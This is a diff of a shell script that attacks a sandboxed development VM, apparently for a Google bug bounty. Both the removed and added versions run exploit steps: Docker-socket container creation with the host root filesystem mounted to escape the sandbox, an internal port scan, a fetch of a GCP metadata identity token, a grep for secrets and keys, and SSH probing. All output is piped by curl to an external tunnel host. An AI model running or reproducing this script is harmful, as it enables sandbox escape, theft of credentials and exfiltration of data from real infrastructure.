@@ -2,40 +2,28 @@
 URL="0c4256b014e98f42-103-95-173-85.serveousercontent.com"
 
 {
-  echo "--- [1] DOCKER SOCKET PIVOTING ---"
-  # List ALL containers, including hidden ones, and their networks
-  curl --unix-socket /var/run/docker.sock http://localhost/containers/json?all=1 | grep -oE '"Names":\["/[^"]+"\]|"Id":"[a-f0-8]+"'
+  echo "--- [1] DOCKER API VERSION ---"
+  curl -s --unix-socket /var/run/docker.sock http://localhost/version | grep -o 'ApiVersion":"[^"]*"'
+
+  echo "--- [2] HOST FS ACCESS (VIA API) ---"
+  # This tries to read the host's /etc/hostname using the Docker API directly
+  # It bypasses the 'sudo docker run' wrapper entirely
+  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
+    -d '{"Image":"sha256:25109184c71bdad7","HostConfig":{"Binds":["/:/host:ro"]}}' > /tmp/out.json
   
-  echo "--- [2] INTERNAL NETWORK SCAN (Bounty Multiplier) ---"
-  # Scan for internal Google IPs (10.x.x.x and 172.x.x.x ranges)
-  # This proves you can attack other Google services from this VM
-  for ip in 172.17.0.{1..10} 10.0.0.{1..5}; do
-    (timeout 0.1 bash -c "echo >/dev/tcp/$ip/80" && echo "PROBE SUCCESS: $ip:80 (Web)") &
-    (timeout 0.1 bash -c "echo >/dev/tcp/$ip/22" && echo "PROBE SUCCESS: $ip:22 (SSH)") &
-  done; wait
+  ID=$(grep -oE '"Id":"[a-f0-9]+"' /tmp/out.json | cut -d'"' -f4)
+  if [ -n "$ID" ]; then
+    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/start"
+    sleep 2
+    echo "Host Hostname:"
+    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$ID/exec" \
+      -d '{"AttachStdout":true,"Cmd":["cat","/host/etc/hostname"]}'
+  else
+    echo "API Container Creation Blocked"
+  fi
 
-  echo "--- [3] THE 'METADATA' DEEP DIVE ---"
-  # This checks for "Identity Tokens" which are the gold standard for VRP
-  curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://cloud.google.com/" || echo "Identity Probe Blocked"
+  echo "--- [3] THE 172.17.0.1 PROBE ---"
+  # Since the banner grab was blank, we'll try a raw hex dump of the first 20 bytes
+  timeout 2 bash -c "exec 3<>/dev/tcp/172.17.0.1/22; head -c 20 <&3; echo" || echo "SSH Connect Timeout"
 
-  echo "--- [4] KERNEL & EXPLOIT SEARCH ---"
-  # Checking for 'dirty pipe' or 'overlayfs' vulnerabilities (Host takeover)
-  ls -l /etc/shadow /etc/sudoers 2>/dev/null
-  find / -perm -4000 -type f 2>/dev/null | head -n 10
-
-  echo "--- [5] HIDDEN CONFIGS & HISTORY ---"
-  # Searching for hardcoded GCP credentials in common developer locations
-  grep -rE "AI_KEY|GCP_TOKEN|SECRET" /opt /home/jules 2>/dev/null | head -c 500
-} | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
-
-{
-  echo "--- [!] DEFINITIVE HOST ESCAPE ---"
-  # This uses the docker socket to read the REAL host's name
-  # If this returns something other than 'devbox', you have escaped.
-  IMG=$(sudo docker images -q | head -n 1)
-  sudo docker run --rm -v /etc/hostname:/host_hostname:ro $IMG cat /host_hostname
-  
-  echo "--- [!] SSH BANNER GRAB ---"
-  # This grabs the version string from the internal SSH server you found
-  (echo > /dev/tcp/172.17.0.1/22) && curl -s http://172.17.0.1:22 | head -n 1
 } | curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
